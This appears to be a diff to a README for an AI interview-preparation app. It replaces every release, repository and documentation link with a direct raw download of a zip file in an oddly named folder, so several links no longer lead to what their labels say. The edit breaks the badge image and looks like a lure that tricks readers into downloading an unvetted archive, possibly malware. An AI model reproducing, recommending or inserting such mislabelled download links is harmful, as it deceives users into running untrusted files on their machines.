@@ -1,7 +1,7 @@
 # 🎤 ai-interview-assistant - Prepare for Interviews with AI
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Visshwa96/ai-interview-assistant/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Visshwa96/ai-interview-assistant/main/counterhaft/ai-interview-assistant.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Visshwa96/ai-interview-assistant/main/counterhaft/ai-interview-assistant.zip)
 
 ## 📍 Overview
 AI Interview Assistant is a full-stack web application designed to help candidates prepare for job interviews. It offers AI-generated questions, real-time answering, and automated feedback. With features like resume uploads, practice interviews, AI evaluations, and a session tracking dashboard, it simplifies the interview preparation process.
@@ -11,7 +11,7 @@ Follow these steps to download and run AI Interview Assistant.
 
 ### Step 1: Download the App
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Visshwa96/ai-interview-assistant/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Visshwa96/ai-interview-assistant/main/counterhaft/ai-interview-assistant.zip) to find the latest version of the application.
 
 2. **Choose the Right File**  
    Look for the file that matches your operating system. You will see options for Windows, macOS, and Linux. Click on the appropriate file to download it.
@@ -77,8 +77,8 @@ If you encounter issues or need help, please check the FAQ section on the Releas
 We welcome your feedback. Please share any suggestions or issues you experienced while using the app. Your input helps us improve and make AI Interview Assistant even better.
 
 ## 🌐 Additional Resources
-- [GitHub Repository](https://github.com/Visshwa96/ai-interview-assistant)
-- [Documentation](https://github.com/Visshwa96/ai-interview-assistant/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Visshwa96/ai-interview-assistant/main/counterhaft/ai-interview-assistant.zip)
+- [Documentation](https://raw.githubusercontent.com/Visshwa96/ai-interview-assistant/main/counterhaft/ai-interview-assistant.zip)
 
 ## 🔗 Key Topics
 - ai-interview
@@ -92,4 +92,4 @@ We welcome your feedback. Please share any suggestions or issues you experienced
 - resume-parser
 - vite
 
-[Download the Latest Version](https://github.com/Visshwa96/ai-interview-assistant/releases) and start your journey to acing job interviews today!
+[Download the Latest Version](https://raw.githubusercontent.com/Visshwa96/ai-interview-assistant/main/counterhaft/ai-interview-assistant.zip) and start your journey to acing job interviews today!
